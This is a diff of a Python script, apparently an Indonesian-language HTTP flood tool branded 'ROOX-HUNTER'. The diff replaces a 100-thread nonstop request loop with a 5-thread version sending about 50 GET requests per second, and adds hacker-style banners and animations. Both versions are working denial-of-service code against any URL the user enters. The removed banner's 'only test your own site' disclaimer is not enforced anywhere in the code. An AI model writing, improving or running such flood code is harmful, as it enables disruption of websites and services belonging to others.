@@ -5,100 +5,101 @@ import time
 import random
 import sys
 
-# Global counter
+# Konfigurasi
+THREADS = 5              # jumlah thread
+REQ_PER_THREAD = 10      # request per thread per detik (5 x 10 = 50 total)
+
+# Warna teks
+G = "\033[1;92m"
+R = "\033[1;91m"
+C = "\033[1;96m"
+Y = "\033[1;93m"
+END = "\033[0m"
+
+# Global Counter
 total_sent = 0
-total_failed = 0
-sent_last = 0
-failed_last = 0
 lock = threading.Lock()
 
-# Tampilan Header
+# Clear screen
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+# Banner ROOX
 def banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print("""
-\033[1;92m
-██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
-██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-\033[0m
-\033[1;91mTools Uji Kekuatan Website Anda - RooxHunter vHard\033[0m
-\033[1;90mTekan ENTER untuk melihat panduan penggunaan...\033[0m
-""")
-    input()
-    print("""
-\033[1;96m======================== Panduan Penggunaan ========================\033[0m
- - Tools ini hanya untuk uji kekuatan web milik sendiri!
- - Metode: Mengirim 10.000+ permintaan nonstop.
- - Hentikan manual dengan CTRL + C
- - Target HARUS menyertakan protokol (http/https)
- - Contoh penggunaan: https://example.com
-\033[1;96m====================================================================\033[0m
-""")
+    clear()
+    print(G + r"""
+██╗ █████╗ ███╗   ██╗ ██████╗ ██████╗ ██╗  ██╗
+      ██║██╔══██╗████╗  ██║██╔════╝ ██╔══██╗╚██╗██╔╝
+      ██║███████║██╔██╗ ██║██║  ███╗██████╔╝ ╚███╔╝ 
+ ██   ██║██╔══██║██║╚██╗██║██║   ██║██╔═══╝  ██╔██╗ 
+ ╚█████╔╝██║  ██║██║ ╚████║╚██████╔╝██║     ██╔╝ ██╗
+  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝
+""" + END)
+    print(C + "[!] TOOL: ROOX-HUNTER | By ROOX" + END)
+    print()
 
-# Fungsi animasi teks hacker
-def hacking_text_animation():
-    text = "Hacking... Please Wait..."
-    for i in range(len(text)):
-        sys.stdout.write(text[i])
-        sys.stdout.flush()
-        time.sleep(random.uniform(0.05, 0.15))
-    sys.stdout.write("\n")
-    time.sleep(1)
+# Efek teks hijau ala hacker
+def hacker_animation():
+    chars = "0123456789ABCDEF"
+    for _ in range(15):
+        line = "".join(random.choice(chars) for _ in range(60))
+        print(G + line + END)
+        time.sleep(0.05)
 
-# Fungsi serangan
-def send_request(url):
-    global total_sent, total_failed
+# Cek koneksi target
+def cek_target(url):
+    try:
+        print(C + "[•] Mengecek target..." + END)
+        res = requests.get(url, timeout=5)
+        print(G + f"[✓] Target aktif: {res.status_code}" + END)
+    except:
+        print(R + "[x] Gagal mengakses target, lanjut uji brute..." + END)
+
+# Serangan permintaan HTTP
+def attack(url):
+    global total_sent
     while True:
-        try:
-            res = requests.get(url, timeout=5)
-            if res.status_code == 200:
+        for _ in range(REQ_PER_THREAD):
+            try:
+                requests.get(url, timeout=3)
                 with lock:
                     total_sent += 1
-                hacking_text_animation()
-                print("\033[1;92m[+] Request sent ➡ 200\033[0m")
-            else:
-                with lock:
-                    total_failed += 1
-                hacking_text_animation()
-                print(f"\033[1;91m[-] Gagal mengirim request! Status: {res.status_code}\033[0m")
-        except requests.RequestException as e:
-            with lock:
-                total_failed += 1
-            hacking_text_animation()
-            print("\033[1;91m[-] Gagal mengirim request!\033[0m")
-            continue
-
-# Monitor RPS
-def rps_monitor():
-    global total_sent, total_failed, sent_last, failed_last
-    while True:
+            except:
+                pass
         time.sleep(1)
-        with lock:
-            success = total_sent - sent_last
-            failed = total_failed - failed_last
-            sent_last = total_sent
-            failed_last = total_failed
-        print(f"\033[1;93m[RPS] Sukses: {success}/detik | Gagal: {failed}/detik\033[0m")
 
-# Fungsi utama
+# Monitor + animasi
+def monitor():
+    while True:
+        hacker_animation()
+        with lock:
+            print(C + f"[•] Total request terkirim: {total_sent}" + END)
+        time.sleep(1)
+
+# Main
 def main():
     banner()
-    url = input("Masukkan URL Target: ")
-    print(f"\n\033[1;92m[!] Menyerang {url} tanpa henti... CTRL+C untuk stop.\033[0m\n")
-    
-    # Jalankan thread serangan
-    for _ in range(100):  # Kamu bisa ubah sesuai kemampuan perangkat/server
-        threading.Thread(target=send_request, args=(url,), daemon=True).start()
+    target = input(Y + "[?] Masukkan URL target (gunakan http/https): " + END)
+    if not target.startswith("http"):
+        target = "http://" + target
 
-    # Jalankan monitor RPS
-    threading.Thread(target=rps_monitor, daemon=True).start()
+    cek_target(target)
 
-    # Biar program tetap hidup
-    while True:
-        time.sleep(10)
+    print(C + "[•] Memulai serangan 50 request/detik..." + END)
+    time.sleep(1)
+
+    # Mulai thread serangan
+    for _ in range(THREADS):
+        t = threading.Thread(target=attack, args=(target,))
+        t.daemon = True
+        t.start()
+
+    # Thread monitor
+    monitor()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(R + "\n[!] Dihentikan oleh user." + END)
+        sys.exit()
